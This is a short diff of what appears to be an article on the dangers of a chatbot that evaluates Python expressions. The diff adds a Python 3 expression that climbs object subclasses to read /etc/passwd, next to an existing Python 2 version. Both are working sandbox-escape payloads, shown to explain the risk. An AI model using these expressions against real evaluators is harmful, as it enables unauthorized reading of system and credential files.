@@ -54,6 +54,12 @@ The developer scoffs aloud to himself.  "Like what?"  Perhaps he even brings the
 Until an enterprising individual asks the bot to calculate the following:
 
 ```python
+[t for t in (1).__class__.__bases__[-1].__subclasses__() if t.__name__ == 'FileLoader'][0].get_data('/', '/etc/passwd')
+```
+
+Or, for Python 2:
+
+```python
 [t for t in (1).__class__.__bases__[-1].__subclasses__() if t.__name__ == 'file'][0]('/etc/passwd').read()
 ```
 
